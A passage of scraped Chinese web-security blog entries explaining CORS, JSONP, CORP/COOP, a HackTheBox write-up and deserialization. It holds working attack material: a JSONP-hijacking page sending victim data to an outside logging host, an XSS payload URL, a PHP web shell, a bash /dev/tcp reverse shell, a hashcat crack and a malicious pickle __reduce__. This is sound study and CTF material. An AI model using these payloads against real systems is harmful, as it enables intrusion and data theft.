class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayCorsConfiguation</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CorsFilter <span class="title function_">corsFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化cors配置对象</span></span><br><span class="line">        <span class="type">CorsConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CorsConfiguration</span>();</span><br><span class="line">        configuration.setAllowCredentials(<span class="literal">true</span>); <span class="comment">// 允许使用cookie，但是使用cookie是addAllowedOrigin必须是具体的地址，不能是*</span></span><br><span class="line"><span class="comment">//        configuration.addAllowedOrigin(&quot;*&quot;);</span></span><br><span class="line">        configuration.addAllowedOrigin(<span class="string">&quot;http://manage.leyou.com&quot;</span>);</span><br><span class="line">        configuration.addAllowedMethod(<span class="string">&quot;*&quot;</span>);  <span class="comment">//允许的请求方式,get,put,post,delete</span></span><br><span class="line">        configuration.addAllowedHeader(<span class="string">&quot;*&quot;</span>);<span class="comment">//允许的头信息</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//初始化cors的源对象配置</span></span><br><span class="line">        <span class="type">UrlBasedCorsConfigurationSource</span> <span class="variable">corsConfigurationSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlBasedCorsConfigurationSource</span>();</span><br><span class="line">        corsConfigurationSource.registerCorsConfiguration(<span class="string">&quot;/**&quot;</span>,configuration);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//3.返回新的CorsFilter.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CorsFilter</span>(corsConfigurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><ul><li>CORS 政策完全由服务器端控制。如果服务器配置不当，可能会导致敏感信息泄露。</li><li><code>Access-Control-Allow-Origin</code> 设置为 <code>*</code> 可以允许所有域名的访问，但这通常不推荐用于处理敏感数据。<br>可以使用这个工具做一些检测 <a href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></li></ul><h2 id="JSONP（JSON-with-Padding）"><a href="#JSONP（JSON-with-Padding）" class="headerlink" title="JSONP（JSON with Padding）"></a>JSONP（JSON with Padding）</h2><p>JSONP 教程   <a href="https://www.runoob.com/json/json-jsonp.html">https://www.runoob.com/json/json-jsonp.html</a><br><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-2.png"><br>JSONP（JSON with Padding）是一种跨域数据交换的技术，它利用了<code>&lt;script&gt;</code>标签没有跨域限制的特性来发送跨域请求，现在的应用很少。<code>callback</code>是一个很有效的关键词，通过在网络请求中检索callback，或许可以找到应用的点，如果返回的json是隐私相关的信息，那么就可以实现信息泄漏等。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>JSONP 的工作原理基于以下两个事实：</p><ol><li>浏览器的同源策略阻止了从不同源加载的脚本访问其他源的 DOM 和 JavaScript 对象，但不禁止向其他源发送<code>&lt;script&gt;</code>标签的请求。</li><li><code>&lt;script&gt;</code>标签的<code>src</code>属性可以用来加载任何来源的 JavaScript 文件。</li></ol><p>当需要从其他域名获取数据时，可以使用 JSONP 方法。这种方式通常涉及到下面几个步骤：</p><ol><li><strong>客户端定义回调函数</strong>：首先在客户端定义一个回调函数，这个函数将处理从服务器获取的数据。</li><li><strong>动态创建 <code>&lt;script&gt;</code> 标签</strong>：然后通过动态创建 <code>&lt;script&gt;</code> 标签的方式来发送请求，请求的 URL 包含一个查询参数，通常是 <code>callback</code>，其值是上一步定义的回调函数的名称。</li><li><strong>服务器响应</strong>：服务器在接收到请求后，会生成 JSON 数据，并将这个数据作为参数传递给查询参数中指定的回调函数，形成一段可执行的 JavaScript 代码。</li><li><strong>执行响应</strong>：当这段带有数据的 JavaScript 代码通过 <code>&lt;script&gt;</code> 标签加载并执行时，定义的回调函数会被调用，并且实际的数据会作为参数传入。</li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设有一个客户端回调函数 <code>handleResponse</code>，你希望从 <code>http://example.com/api</code> 获取数据，你可以这样实现 JSONP 请求：<br><strong>客户端代码</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Received data: &quot;</span> + data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;http://example.com/api?callback=handleResponse&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure><p><strong>服务器端响应</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;);</span><br></pre></td></tr></table></figure><p>这段响应是一个 JavaScript 代码，调用了客户端定义的 <code>handleResponse</code> 函数，并传入了数据。</p><h3 id="安全考虑"><a href="#安全考虑" class="headerlink" title="安全考虑"></a>安全考虑</h3><p>1、对于输入的callback函数名过滤不严格，导致输入的数据直接输出到前端造成XSS<br>2、JSONP劫持漏洞，由于对于来源域没有严格限制，因此来源于不安全的域的请求也会被响应<br>随着 CORS（跨源资源共享）标准的普及，JSONP 的使用越来越少。CORS 提供了一种更安全、更灵活的跨域请求方式，允许服务器更精细地控制哪些网站可以访问哪些资源，同时支持所有类型的 HTTP 请求（不仅仅是 GET 请求），而 JSONP 仅支持 GET 请求。因此，在现代 Web 应用开发中，推荐使用 CORS 而不是 JSONP。</p><p>直接构造xss：<code>http://xxxxxx/jsonp/index.php?callback=jsonp_5981%3Cimg%20src=x%20onerror=alert(/xss/)%3E</code>，可以获取到用户的cookie信息或者劫持用户跳转到钓鱼网站<br>JSONP劫持：JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构造恶意的JS代码，当合法用户点击该网页，由于目标站点存在JSONP劫持漏洞的接口，因此会将用户的该接口对应的信息劫持，并将其发送到攻击者的服务器。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;jsonp劫持&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> h=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        a=key+<span class="string">&#x27; : &#x27;</span>+v[key]+<span class="string">&#x27; ,&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        h+=a</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(h);</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">get</span>(<span class="string">&#x27;http://jsonp1.kijkv0.ceye.io?value=&#x27;</span>+h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.31.149/jsonp/index.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一旦被攻击者访问该网页，就会自动触发，会自动访问具有漏洞的jsonp接口，利用被攻击者自己的session获取到被攻击者的信息，并将该信息远程发送到攻击者的服务器上</p><h2 id="其他解决跨域问题的方案"><a href="#其他解决跨域问题的方案" class="headerlink" title="其他解决跨域问题的方案"></a><a href="https://blog.csdn.net/qq_51383106/article/details/131458419">其他解决跨域问题的方案</a></h2><p>利用nginx进行反向代理，在一个服务器上配置多个前缀来转发http&#x2F;https请求到多个真实的服务器即可。在 nginx 中配置反向代理服务器，将客户端的请求转发到后端服务器，并在转发过程中添加相应的响应头。例如，假设前端服务器运行在 <a href="http://frontend.example.com,后端服务器运行在/">http://frontend.example.com，后端服务器运行在</a> <a href="http://backend.example.com,则可以在/">http://backend.example.com，则可以在</a> nginx 中配置如下的反向代理服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name frontend.example.com;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://backend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Origin http://frontend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置中，location &#x2F;api 将客户端请求中的 &#x2F;api 转发到后端服务器的对应接口。<br>add_header Access-Control-Allow-Origin <a href="http://frontend.example.com/">http://frontend.example.com</a> 表示允许来自 <a href="http://frontend.example.com/">http://frontend.example.com</a> 的跨域请求。<br>add_header Access-Control-Allow-Credentials true 表示允许跨域请求携带 cookie。<br>设置相应的响应头在响应头中添加相应的跨域设置，以允许客户端发送跨域请求和携带 cookie。例如，添加 Access-Control-Allow-Origin 和 Access-Control-Allow-Credentials 头部：Access-Control-Allow-Origin: <a href="http://frontend.example.com/">http://frontend.example.com</a><br>Access-Control-Allow-Credentials: true这样客户端在向后端服务器发送请求时，就能携带 cookie，并允许跨域请求。</p><p>还有很多前端跨域解决方案：<a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="新的安全措施-CORP-COOP"><a href="#新的安全措施-CORP-COOP" class="headerlink" title="新的安全措施 CORP COOP"></a>新的安全措施 CORP COOP</h2><p><a href="https://www.cnblogs.com/Yangyecool/p/13417794.html">https://www.cnblogs.com/Yangyecool/p/13417794.html</a><br><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy</a><br>在现代浏览器安全中，除了CORS以外，还有两个相对较新的安全策略，分别是CORP（Cross-Origin Resource Policy）和COOP（Cross-Origin Opener Policy）。这两种策略都是为了进一步加强跨域安全，尤其是在防止某些类型的跨站攻击（如跨站脚本和跨站请求伪造）和数据泄露方面。<br>同源策略也有一些例外，任何网站都可以不受限制的加载下面的资源：</p><ul><li>嵌入跨域 iframe</li><li>image、script 等资源</li><li>使用 DOM 打开跨域弹出窗口<br>对于这些资源，浏览器可以将各个站点的跨域资源分隔在不同的 Context Group 下，不同的 Context Group 下资源无法相互访问。<br>浏览器 Context Group 是一组共享相同上下文的 tab、window或iframe。例如，如果网站（<a href="https://a.example)打开弹出窗口(https//b.example%EF%BC%89%EF%BC%8C%E5%88%99%E6%89%93%E5%BC%80%E5%99%A8%E7%AA%97%E5%8F%A3%E5%92%8C%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E5%85%B1%E4%BA%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E6%B5%8F%E8%A7%88%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AE%83%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87">https://a.example）打开弹出窗口（https://b.example），则打开器窗口和弹出窗口共享相同的浏览上下文，并且它们可以通过</a> DOM API相互访问，例如 window.opener。</li></ul><p>长久以来，这些安全策略一直保护着网站的隐私数据，直到 Spectre 漏洞出现。Spectre 是一个在 CPU 中被发现的漏洞，利用 Spectre ，攻击者可以读取到在统一浏览器下任意 Context Group 下的资源。特别是在使用一些需要和计算机硬件进行交互的 API 时：</p><ul><li>SharedArrayBuffer (required for WebAssembly Threads)</li><li>performance.measureMemory()</li><li>JS Self-Profiling API<br>为此，浏览器一度禁用了 SharedArrayBuffer 等高风险的 API。</li></ul><h3 id="CORP（Cross-Origin-Resource-Policy）"><a href="#CORP（Cross-Origin-Resource-Policy）" class="headerlink" title="CORP（Cross-Origin Resource Policy）"></a>CORP（Cross-Origin Resource Policy）</h3><p><strong>CORP</strong> 是一种浏览器安全策略，允许开发者限制哪些跨源请求可以加载资源。这个策略主要是通过 HTTP 响应头 <code>Cross-Origin-Resource-Policy</code> 实现的，可以控制资源（如图像、CSS、JavaScript等）是否可以被另一个域加载。</p><p><strong>使用场景</strong>：<br>CORP 主要用于防止资源被不同源的网站读取或嵌入。例如，一个网站可以决定其资源只能由同源网站或特定的源网站加载。<br><strong>响应头选项</strong>：</p><ul><li><code>Cross-Origin-Resource-Policy: same-origin</code>：只有同源的站点可以加载资源。</li><li><code>Cross-Origin-Resource-Policy: same-site</code>：只有相同站点（即顶级域名相同）的请求可以加载资源。</li><li><code>Cross-Origin-Resource-Policy: cross-origin</code>：任何网站都可以加载资源。这相当于没有应用任何CORP。</li></ul><h3 id="COOP（Cross-Origin-Opener-Policy）"><a href="#COOP（Cross-Origin-Opener-Policy）" class="headerlink" title="COOP（Cross-Origin Opener Policy）"></a>COOP（Cross-Origin Opener Policy）</h3><p><strong>COOP</strong> 是一种浏览器安全策略，用于隔离来自不同源的浏览器上下文（如窗口和标签页），从而防止潜在的恶意文档影响正常文档，或在两者之间进行数据泄露。这个策略主要通过 HTTP 响应头 <code>Cross-Origin-Opener-Policy</code> 来设置。</p><p><strong>使用场景</strong>：<br>COOP 主要用于创建一个安全的环境，其中的页面不会与不同源的页面共享相同的进程，因此可以阻止恶意网站通过窗口间通信（如 <code>window.opener</code>）来泄露信息或进行攻击。<br><strong>响应头选项</strong>：</p><ul><li><code>Cross-Origin-Opener-Policy: same-origin</code>：只有同源的页面才能与当前页面共享同一个浏览器进程。</li><li><code>Cross-Origin-Opener-Policy: same-origin-allow-popups</code>：与 <code>same-origin</code> 相同，但允许弹出窗口（由当前页面创建）与其共享同一个进程。</li><li><code>Cross-Origin-Opener-Policy: unsafe-none</code>：不隔离源，所有页面共享同一进程，这是大多数页面的默认行为。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【hackthebox】解题记录</title>
      <link href="/2024/09/19/WebSecurity/ctf/hackthebox/"/>
      <url>/2024/09/19/WebSecurity/ctf/hackthebox/</url>
      
        <content type="html"><![CDATA[<h2 id="Sightless"><a href="#Sightless" class="headerlink" title="Sightless"></a>Sightless</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先用nmap扫描一下：<code>nmap -sC -sV 10.10.11.32 -T4 -oN nmap.txt</code><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image.png" alt="端口开放"><br>发现有web服务，访问web页面。另外存在ftp和ssh服务，这些都可能是后面的突破点，先看下web服务。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-1.png" alt="Unknown host"><br>需要修改下host文件了，添加一行 <code>10.10.11.32 sightless.htb</code><br>访问<code>http://sightless.htb</code><br>页面中只有一个SQLPad是有用的，我们访问这个页面（仍然需要修改host文件）<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-2.png" alt="SQLPad"><br>首先想到的是SQLPad应该是会有一些CVE在的，百度搜一下发现有个<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-3.png" alt="CVE"><br>刚好和当前的版本是一致的</p><p>太寄了<br><a href="https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b">https://medium.com/@vikram1337/sightless-hackthebox-9599be0ee25b</a></p><h3 id="GreenHorn"><a href="#GreenHorn" class="headerlink" title="GreenHorn"></a>GreenHorn</h3><p><a href="https://blog.csdn.net/zegeai/article/details/122660540">https://blog.csdn.net/zegeai/article/details/122660540</a><br><a href="https://blog.csdn.net/weixin_63279914/article/details/142436931">https://blog.csdn.net/weixin_63279914/article/details/142436931</a><br><a href="https://blog.csdn.net/qq_23003811/article/details/140635016">https://blog.csdn.net/qq_23003811/article/details/140635016</a></p><p>还是常规的先进行信息搜集，探测下端口<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-4.png"><br>80、3000、9001都开放了，访问web服务（修改host）<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-5.png" alt="看上去是个论坛"><br>进一步搜集发现数据包中有cms信息指纹：pluck 4.7.18，百度了下有CVE漏洞，是文件上传的命令执行，但需要首先登录到后台，尝试猜了下密码，失败了。<br>还有两个端口没看，试试看有没有新思路，访问3000端口，看上去是一个类似git的内部版本控制平台，注册账号进入后发现有套源代码，就是上面的pluck<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-6.png"><br>下载分析，直接看login.php，有相应的登陆逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha512&#x27;</span>, <span class="variable">$cont1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$pass</span> == <span class="variable">$ww</span>) &amp;&amp; (!<span class="keyword">isset</span>(<span class="variable">$login_error</span>))) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$token</span>] = <span class="string">&#x27;pluck_loggedin&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Delete loginattempt file, if it exists.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(LOGIN_ATTEMPT_FILE))</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(LOGIN_ATTEMPT_FILE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display success message.</span></span><br><span class="line"><span class="title function_ invoke__">show_error</span>(<span class="variable">$lang</span>[<span class="string">&#x27;login&#x27;</span>][<span class="string">&#x27;correct&#x27;</span>], <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>]))</span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;pluck_before&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;admin.php?action=start&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;data/inc/footer.php&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局检索 <code>$ww</code> ctrl+shift+F 发现密码硬编码在文件中，是经过sha512哈希后的。<br>网上查了下，可以用hashcat爆破下，用到了kali自带的字典 <code>wordlists/rockyou.txt</code>爆破语句如下<br><code>hashcat -a 0 -m 1700 &#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163&#39; /usr/share/wordlists/rockyou.txt</code><br>上面的命令是使用hashcat，一个广泛使用的密码恢复工具，来尝试破解哈希值。hashcat 支持多种加密算法，并能利用CPU和GPU的强大力量来加速密码的恢复过程。这里是命令的详细解析：</p><ul><li><code>-a 0</code>: 这个选项指定了攻击模式，<code>0</code>代表直接字典攻击。在这种模式下，hashcat 会使用一个字典文件中的每一个词条来生成哈希，然后与给定的哈希值进行比较。</li><li><code>-m 1700</code>: 这个选项指定了哈希类型，<code>1700</code>代表SHA-512算法。hashcat 支持多种哈希算法，每种算法都有一个独特的代码。</li><li><code>/usr/share/wordlists/rockyou.txt</code>: 这是字典文件的路径。<code>rockyou.txt</code>是一个非常著名的密码字典，包含了数百万常用密码，这些密码是从历史数据泄露中汇编而成。hashcat 将使用这个文件中的每一个词条作为输入，生成哈希值，并检查是否与目标哈希值匹配。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-7.png"><br>根据输出结果可以判断成功爆破出密码：iloveyou1，成功登陆后台。<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-8.png"><br>利用pluck的漏洞，构造文件phpinfo.php，<code>&lt;?php phpinfo();system($_GET[cmd]);?&gt;</code>，并压缩成压缩包，phpinfo.zip。上传之后自动跳转<br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-9.png"><br><img src="/2024/09/19/WebSecurity/ctf/hackthebox/image-10.png" alt="成功看到phpinfo界面"><br>但后续按照上面的博客继续尝试，发现不能执行命令，被拦截了，尝试直接反弹shell：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/106.54.6.xxx/4444 0&gt;&amp;1&#x27; &quot;); ?&gt;</span><br><span class="line">zip rev.zip rev.php </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第三部分 Python反序列化分析</title>
      <link href="/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/"/>
      <url>/2024/09/18/WebSecurity/owasptop/pythondeserialization-md/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Python的序列化和PHP的很像</p><p>Python序列化相关函数：<br>pickle.dump(obj, file) : 将对象序列化后保存到文件<br>pickle.load(file) : 读取文件， 将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj) : 将对象序列化成字符串格式的字节流<br>pickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象</p><p>同样，在Python中也存在魔术方法：<br><code>__reduce__()</code>反序列化时调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><p><code>__init__</code> 本质就是python中的构造函数，在对象被实例化时调用<br><code>__reduce_ex__()</code> 反序列化时调用<br><code>__setstate__()</code> 反序列化时调用<br><code>__getstate__()</code> 序列化时调用</p><p>Python代码审计工具 bandit</p><h1 id="CVE分析"><a href="#CVE分析" class="headerlink" title="CVE分析"></a>CVE分析</h1><h2 id="CVE-2019-6446-Numpy反序列化命令执行"><a href="#CVE-2019-6446-Numpy反序列化命令执行" class="headerlink" title="CVE-2019-6446 Numpy反序列化命令执行"></a>CVE-2019-6446 Numpy反序列化命令执行</h2><p><a href="https://www.freebuf.com/vuls/194540.html">https://www.freebuf.com/vuls/194540.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】反序列化漏洞分析笔记 - 第二部分 Java反序列化分析</title>
      <link href="/2024/09/12/WebSecurity/owasptop/javadeserialization/"/>
      <url>/2024/09/12/WebSecurity/owasptop/javadeserialization/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1590955">参考</a><br><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>其实和PHP的反序列化差不多，本来想写在一起的还是分开了,Java和PHP最大的不同我感觉就是利用的触发方式，PHP因为有魔术方法所以更多（虽然但是Java也有反射）。<br>HTTP：多平台之间的通信，管理等<br>RMI：是Java的一组拥护开发分布式应用程序的API，实现了不同操作系统之间程序的方法调用。值得注意的是，RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口。<br>JMX：JMX是一套标准的代理和服务，用户可以在任何Java应用程序中使用这些代理和服务实现管理,中间件软件WebLogic的管理页面就是基于JMX开发的，而JBoss则整个系统都基于JMX构架。</p><p>只有实现了Serializable接口的类的对象才可以被序列化，Serializable 接口是启用其序列化功能的接口。</p><p>Java接口： Serializable Externalizable 接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject 等</p><p>Java反序列化后的数据会有一些特征，这在黑盒测试中很有用：<br>以 rO0AB 开头，可以确定这串就是 JAVA 序列化 base64 加密的数据（Java 序列化协议的二进制标识符 aced 0005，是 Java 序列化协议的固定魔术头）<br>或者如果以 aced 开头，那么则可能是 java 序列化的 16 进制。</p><p>可能会出现的地方：http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: 